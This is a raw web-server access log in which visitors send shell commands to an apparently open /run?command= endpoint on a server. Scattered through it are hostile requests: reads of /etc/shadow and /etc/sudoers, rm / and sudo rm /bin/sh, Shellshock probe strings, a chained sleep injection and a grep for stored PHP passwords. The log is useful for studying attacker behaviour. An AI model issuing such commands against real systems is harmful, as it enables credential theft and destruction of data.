162.13.142.27 - - [19/Jan/2015:15:09:14 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 452 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:09:18 +0000] "GET /run?command=sudo%20-i HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:09:27 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
108.61.101.156 - - [19/Jan/2015:15:09:27 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
108.61.101.156 - - [19/Jan/2015:15:09:28 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
195.68.92.35 - - [19/Jan/2015:15:09:43 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
195.68.92.35 - - [19/Jan/2015:15:09:43 +0000] "GET /favicon.ico HTTP/1.1" 404 233 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
195.68.92.35 - - [19/Jan/2015:15:09:43 +0000] "GET /favicon.ico HTTP/1.1" 404 233 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
81.155.65.157 - - [19/Jan/2015:15:09:45 +0000] "GET /run?command=ls%20/root HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:09:48 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
195.68.92.35 - - [19/Jan/2015:15:09:51 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
81.155.65.157 - - [19/Jan/2015:15:10:00 +0000] "GET /run?command=ls%20/etc HTTP/1.1" 200 869 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
195.68.92.35 - - [19/Jan/2015:15:10:20 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
81.155.65.157 - - [19/Jan/2015:15:10:25 +0000] "GET /run?command=cat%20/etc/sudoers HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
195.68.92.35 - - [19/Jan/2015:15:10:29 +0000] "GET /run?command=rm+/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
81.155.65.157 - - [19/Jan/2015:15:10:31 +0000] "GET /run?command=cat%20/etc/shadow HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
195.68.92.35 - - [19/Jan/2015:15:10:33 +0000] "GET /run?command=rm+/bin/sh HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
87.64.157.146 - - [19/Jan/2015:15:10:35 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
87.64.157.146 - - [19/Jan/2015:15:10:35 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
195.68.92.35 - - [19/Jan/2015:15:10:38 +0000] "GET /run?command=sudo+rm+/bin/sh HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
195.68.92.35 - - [19/Jan/2015:15:10:40 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
195.68.92.35 - - [19/Jan/2015:15:10:44 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
96.44.10.210 - - [19/Jan/2015:15:10:45 +0000] "GET /run?command=lscpu HTTP/1.1" 200 337 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
87.64.157.146 - - [19/Jan/2015:15:10:48 +0000] "GET /run?command=ls-a HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
195.68.92.35 - - [19/Jan/2015:15:10:49 +0000] "GET /run?command=ls+/bin/ HTTP/1.1" 200 1114 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
87.64.157.146 - - [19/Jan/2015:15:10:55 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
87.64.157.146 - - [19/Jan/2015:15:11:05 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 411 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
12.249.255.74 - - [19/Jan/2015:15:11:14 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 451 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
12.249.255.74 - - [19/Jan/2015:15:11:17 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
92.83.133.51 - - [19/Jan/2015:15:11:50 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
92.83.133.51 - - [19/Jan/2015:15:11:50 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
92.83.133.51 - - [19/Jan/2015:15:11:59 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:12:15 +0000] "GET /run?command=env%20x=%27()%20{%20:;};%20echo%20vulnerable%27%20bash%20-c%20%27echo%20hello%27 HTTP/1.1" 200 6 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
164.68.25.206 - - [19/Jan/2015:15:12:33 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
164.68.25.206 - - [19/Jan/2015:15:12:34 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
129.240.203.166 - - [19/Jan/2015:15:12:35 +0000] "GET /run?command=uptime HTTP/1.1" 200 86 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
164.68.25.206 - - [19/Jan/2015:15:12:40 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 602 "-" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:12:45 +0000] "GET /run?command=bash%20--version HTTP/1.1" 200 270 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
164.68.25.206 - - [19/Jan/2015:15:13:03 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1279 "-" "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:13:13 +0000] "GET /run?command=env%20x=%27()%20;%20echo%20vulnerable%27%20bash%20-c%20%22echo%20this%20is%20a%20test%22 HTTP/1.1" 200 15 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
89.144.207.59 - - [19/Jan/2015:15:13:14 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
129.97.124.115 - - [19/Jan/2015:15:13:27 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "https://www.reddit.com/r/hacking/comments/2sv2jh/this_is_running_on_my_server_do_whatever_you_like/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.115 - - [19/Jan/2015:15:13:28 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.115 - - [19/Jan/2015:15:13:42 +0000] "GET /run?command=ls%20/home HTTP/1.1" 200 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.115 - - [19/Jan/2015:15:13:45 +0000] "GET /run?command=ls%20/home/ubuntu HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.115 - - [19/Jan/2015:15:13:49 +0000] "GET /run?command=ls%20/home/python HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:13:50 +0000] "GET /run?command=env%20check=%27Not%20vulnerable%27%20x=%27()%20{%20:;};%20check=Vulnerable%27%20bash%20-c%20%27echo%20$check%27 HTTP/1.1" 200 15 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.115 - - [19/Jan/2015:15:13:53 +0000] "GET /run?command=ls%20/home/ HTTP/1.1" 200 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.115 - - [19/Jan/2015:15:13:56 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:13:59 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.115 - - [19/Jan/2015:15:14:00 +0000] "GET /run?command=ls%20/tmp HTTP/1.1" 200 70 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:14:01 +0000] "GET /run?command=echo%20hello%20%3E%20hello.log HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:14:09 +0000] "GET /run?command=nano%20hello.log HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
128.40.36.6 - - [19/Jan/2015:15:14:12 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 464 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.14 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.14"
128.40.36.6 - - [19/Jan/2015:15:14:12 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://gentlemens.io/run?command=tail%20/var/log/nginx/python.access.log" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.14 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.14"
66.55.150.185 - - [19/Jan/2015:15:14:24 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
66.55.150.185 - - [19/Jan/2015:15:14:24 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://gentlemens.io/run?command=ls" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
87.64.157.146 - - [19/Jan/2015:15:14:31 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1303 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:14:32 +0000] "GET /run?command=apt-get%20install%20screen HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
96.44.10.210 - - [19/Jan/2015:15:14:37 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 587 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:14:40 +0000] "GET /run?command=ls%20/boot%20|%20grep%20vmlinuz- HTTP/1.1" 200 57 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
96.44.10.210 - - [19/Jan/2015:15:14:43 +0000] "GET /run?command=tail%20/var/log/nginx/ls HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:14:45 +0000] "GET /run?command=df%20-h HTTP/1.1" 200 221 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
96.44.10.210 - - [19/Jan/2015:15:14:49 +0000] "GET /run?command=tail%20/var/log/nginx/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:14:59 +0000] "GET /run?command=top HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:15:00 +0000] "GET /run?command=top?command=top HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
66.55.150.185 - - [19/Jan/2015:15:15:02 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
129.97.124.117 - - [19/Jan/2015:15:15:02 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:15:03 +0000] "GET /run?command=dmesg%20|%20grep%20Linux HTTP/1.1" 200 198 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:03 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
66.55.150.185 - - [19/Jan/2015:15:15:04 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
162.13.142.27 - - [19/Jan/2015:15:15:06 +0000] "GET /run?command=ls%20-all HTTP/1.1" 200 401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:11 +0000] "GET /run?command=ls%20tmp HTTP/1.1" 200 70 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:14 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:15:15:18 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
66.55.150.185 - - [19/Jan/2015:15:15:18 +0000] "GET /run?command=ls\x5C&\x5C&sleep%2020 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
129.97.124.117 - - [19/Jan/2015:15:15:20 +0000] "GET /run?command=ls%20etc HTTP/1.1" 200 869 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:15:20 +0000] "GET /run?command=ls%20home HTTP/1.1" 200 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:24 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:15:28 +0000] "GET /run?command=ls%20python HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:15:30 +0000] "GET /run?command=cat%20/etc/profile HTTP/1.1" 200 376 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:30 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:34 +0000] "GET /run?command=pwd HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:15:38 +0000] "GET /run?command=ls%20home/python HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:39 +0000] "GET /run?command=cd%20&&%20pwd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
66.55.150.185 - - [19/Jan/2015:15:15:41 +0000] "GET /run?command=sleep+100 HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
162.13.142.27 - - [19/Jan/2015:15:15:42 +0000] "GET /run?command=ls%20home/python?command=ls%20/home/python HTTP/1.1" 200 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:42 +0000] "GET /run?command=cd%20;%20pwd HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:47 +0000] "GET /run?command=env HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:15:48 +0000] "GET /run?command=ls%20home/python/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:15:50 +0000] "GET /run?command=ls%20home/python/?command=ls%20home/python HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
162.13.142.27 - - [19/Jan/2015:15:15:55 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 432 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:15:56 +0000] "GET /run?command=lpstat%20-a HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:15:56 +0000] "GET /run?command=ps%20aux HTTP/1.1" 200 2107 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:16:04 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 487 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:16:15 +0000] "GET /run?command=top HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:16:17 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
129.97.124.117 - - [19/Jan/2015:15:16:22 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1310 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:16:25 +0000] "GET /run?command=cat%20/etc/services HTTP/1.1" 200 8255 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
213.88.148.3 - - [19/Jan/2015:15:16:27 +0000] "GET / HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
213.88.148.3 - - [19/Jan/2015:15:16:28 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:17:09 +0000] "GET /run?command=ls%20-aRl%20/etc/%20|%20awk%20%27$1%20~%20/^.*r.*/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
150.70.173.52 - - [19/Jan/2015:15:17:31 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
81.155.65.157 - - [19/Jan/2015:15:17:39 +0000] "GET /run?command=find%20.%20-name%20%22*.php%22%20-print0%20|%20xargs%20-0%20grep%20-i%20-n%20%22var%20$password%22 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
